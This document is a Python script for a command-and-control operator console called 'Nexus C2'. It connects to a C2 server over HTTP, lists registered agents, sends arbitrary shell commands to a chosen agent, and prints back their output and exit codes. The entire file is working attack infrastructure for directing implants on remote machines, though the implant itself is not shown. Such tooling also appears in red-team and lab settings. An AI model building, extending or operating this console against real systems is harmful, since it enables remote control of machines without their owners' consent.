import json
import os
import sys

import requests

SERVER = os.environ.get("NEXUS_SERVER", "http://127.0.0.1:8080")
PROMPT = "nexus> "

HELP = """\
Commands:
  agents                      list connected agents
  task <agent_id> <command>   send command to agent
  results <agent_id>          show results for agent
  help                        show this message
  exit / quit                 exit
"""


def _get(path: str):
    return requests.get(SERVER + path, timeout=5).json()


def _post(path: str, body: dict):
    return requests.post(SERVER + path, json=body, timeout=5).json()


def run() -> None:
    print(f"Nexus C2 console — connected to {SERVER}")
    print(HELP)
    while True:
        try:
            line = input(PROMPT).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        parts = line.split(None, 2)
        cmd   = parts[0].lower()

        if cmd in ("exit", "quit"):
            break

        if cmd == "help":
            print(HELP)

        elif cmd == "agents":
            try:
                data = _get("/agents")
                if not data:
                    print("  (no agents registered)")
                for a in data:
                    print(f"  {a['agent_id']}  status={a['status']}  "
                          f"pending={a['pending_tasks']}")
            except Exception as exc:
                print(f"  error: {exc}")

        elif cmd == "task":
            if len(parts) < 3:
                print("  usage: task <agent_id> <command>")
                continue
            agent_id = parts[1]
            command  = parts[2]
            try:
                resp = _post(f"/agents/{agent_id}/task", {"cmd": command})
                print(f"  {resp}")
            except Exception as exc:
                print(f"  error: {exc}")

        elif cmd == "results":
            if len(parts) < 2:
                print("  usage: results <agent_id>")
                continue
            agent_id = parts[1]
            try:
                data = _get(f"/agents/{agent_id}/results")
                if not data:
                    print("  (no results)")
                for r in data:
                    print(f"\n  task_id={r.get('task_id','?')[:8]}  "
                          f"exit={r.get('exit_code','?')}")
                    if r.get("stdout"):
                        print(r["stdout"].rstrip())
                    if r.get("stderr"):
                        print("[stderr]", r["stderr"].rstrip())
            except Exception as exc:
                print(f"  error: {exc}")

        else:
            print(f"  unknown command: {cmd} (type 'help')")
